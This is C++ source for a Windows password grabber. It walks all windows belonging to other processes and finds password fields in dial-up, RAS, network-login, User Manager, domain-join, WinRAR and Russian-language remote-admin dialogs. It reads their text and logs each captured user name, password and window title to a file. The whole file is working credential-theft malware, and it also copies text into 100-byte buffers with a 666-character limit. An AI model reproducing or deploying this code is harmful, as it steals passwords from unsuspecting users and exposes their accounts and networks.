#include "winapp32.h"

struct DlgWndInfo
{
 WORD un, psw;
 char WndTitle[50];
 char Src[50];
};

#define WINDOWS_KNOWN  14

DlgWndInfo KnownWindows[WINDOWS_KNOWN] =
{
 {
  0, 12206,
  "Change Password",
  "Dial-up pswd expired"
 },
 {
  11403, 11405,
  "Connect to ",
  "Dial-up"
 },
 {
  11403, 11405,
  "Connect to ",
  "Dial-up"
 },
 {
  8202, 8203,
  "Enter network password",
  "Remote connection"
 },
 {
  0, 162,
  "Share Permissions",
  "Shared resource"
 },
 {
  2022, 2007,
  "Create Computer Account in",
  "WinNT CPL - Add WS to domain"
 },
 {
  2022, 2007,
  "Identification Changes",
  "WinNT CPL - Add WS to domain"
 },
 {
  1108, 1104,
  "User Properties",
  "WinNT User Manager (Existing user)"
 },
 {
  1107, 1104,
  "New User",
  "WinNT User Manager (New user)"
 },
 {
  102, 101,
  "Enter password",
  "WinRAR (Unpack)"
 },
 {
  0, 101,
  "Enter default password",
  "WinRAR (Default password)"
 },
 {
  0,403,
  "Удаленное управление",
  "Remote admin"
 },
 {
  1002,1004,
  "Установка связи",
  "RAS Dialup"
 },
 {
  1143,1145,
  "Вход в систему",
  "RAS Login"
 }
};

char LastSavedPassword[666];
char PasswordFileName[666];

//Declaration
void SavePassword(char* from, char* fulltitle, char* user, char* passwd)
{;;
 if (strcmp(passwd,LastSavedPassword)==0) return;;
 if (strlen(passwd)==0) return;;
 strcpy(LastSavedPassword,passwd);;
 char hhh[666];;
 sprintf(hhh,"Source  : %s",from);;
 Log(hhh,PasswordFileName,false);
 sprintf(hhh,"For     : %s",user);;
 Log(hhh,PasswordFileName,false);
 sprintf(hhh,"Password: %s",passwd);;
 Log(hhh,PasswordFileName,false);
 sprintf(hhh,"Title   : %s",fulltitle);;
 Log(hhh,PasswordFileName,false);
};

//Declaration
bool IsPasswordWnd(HWND hwnd)
{;;
 LONG Style = GetWindowLong(hwnd,GWL_STYLE);;
 char classname[666];;
 classname[0] = '\x0';;
 GetClassName(hwnd,classname,666);;
 return ((Style&ES_PASSWORD)!=0)&&(stricmp(classname,"Edit")==0);;
};


//Declaration
void iGetWindowText(HWND hWnd, char* s, int MaxSize)
{;;
 SendMessage(hWnd,WM_GETTEXT,(WPARAM)MaxSize,(LPARAM)s);;
};

//Declaration
bool ProcessKnownWnd(HWND hwnd, DlgWndInfo* WRec)
{;;
 char pass[100];;
 char un[100];;
 char title[100];;
 strcpy(pass,"");;
 GetWindowText(hwnd,title,100);;
 if (strncmp(title,WRec->WndTitle,strlen(WRec->WndTitle))!=0) return false;;
 strcpy(un,"");;
 HWND di;;
 if (WRec->un!=0)
 {;;
  di = GetDlgItem(hwnd,WRec->un);;
  iGetWindowText(di,un,666);;
 };;
 di = GetDlgItem(hwnd,WRec->psw);;
 if (!IsPasswordWnd(di)) return false;;
 iGetWindowText(di,pass,666);;
 SavePassword(WRec->Src,title,un,pass);;
 return true;;
};

//Declaration
BOOL CALLBACK PswEnumChildProc(HWND  hwnd, LPARAM  lParam)
{;;
 if (!IsPasswordWnd(hwnd)) return true;;
 char pass[666],title[666],hhh[800];;
 strcpy(pass,"");;
 strcpy(title,"");;
 iGetWindowText(hwnd,pass,666);;
 iGetWindowText((HWND)lParam,title,666);;
 SavePassword("Unknown",title,"N/A",pass);;
 // stop enumeration
 return false;;  // it's rare to meet two password prompts in one dialog
                 // of course it can be fixed quite simple
};;

//Declaration
BOOL CALLBACK PswEnumProc(HWND  hwnd, LPARAM)
{;;
 DWORD PID = 0;;
 GetWindowThreadProcessId(hwnd,&PID);;
 if (GetCurrentProcessId()==PID) return true;;
 for (int i=0; i<WINDOWS_KNOWN; i++)
  if (ProcessKnownWnd(hwnd, &KnownWindows[i])) return true;;
 EnumChildWindows(hwnd,(int (__stdcall*)())PswEnumChildProc,(LPARAM)hwnd);;
 return true;;
};;


//Declaration
void LookForPasswords()
{;;
 EnumWindows((int (__stdcall*)())PswEnumProc,666);;
};